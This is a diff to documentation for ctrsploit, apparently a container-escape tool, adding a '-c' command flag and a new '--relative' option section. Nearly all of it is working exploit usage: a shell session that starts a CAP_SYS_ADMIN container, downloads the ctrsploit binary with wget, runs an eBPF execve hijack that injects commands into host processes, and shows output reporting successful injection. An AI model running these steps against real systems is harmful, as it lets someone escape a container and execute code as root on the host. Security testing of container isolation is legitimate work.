@@ -69,7 +69,7 @@ $ ./ssh
 root@localhost:~# docker run -ti --cap-add=CAP_SYS_ADMIN busybox:latest ash
 / # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
 / # chmod +x /usr/bin/ctrsploit
-/ # ctrsploit vul caps sys_admin x ebpf execve
+/ # ctrsploit vul caps sys_admin x ebpf execve -c /bin/ls
 INFO[0000] Waiting for events..
 ```
 
@@ -102,4 +102,16 @@ root@localhost:/# whoami
 root
 root@localhost:/# whoami
 bin  bin.usr-is-merged	boot  dev  etc	home  lib  lib.usr-is-merged  lib64  lost+found  media	mnt  opt  proc	root  run  sbin  sbin.usr-is-merged  srv  sys  tmp  usr  var
+```
+
+### 6.2 --relative
+
+use `--relative` or `-r` option, to let ctrsploit auto build the host path of a container path.
+
+```shell
+/ # ctrsploit vul caps sys_admin x ebpf execve -p /aaa -r 
+INFO[0000] Waiting for events..                         
+INFO[0000] Host pid: 250903                             
+INFO[0000] set up command as: "/proc/250903/root/aaa\x00" 
+INFO[0003] pid: 250910, pathname: /usr/bin/id, injected: true 
 ```
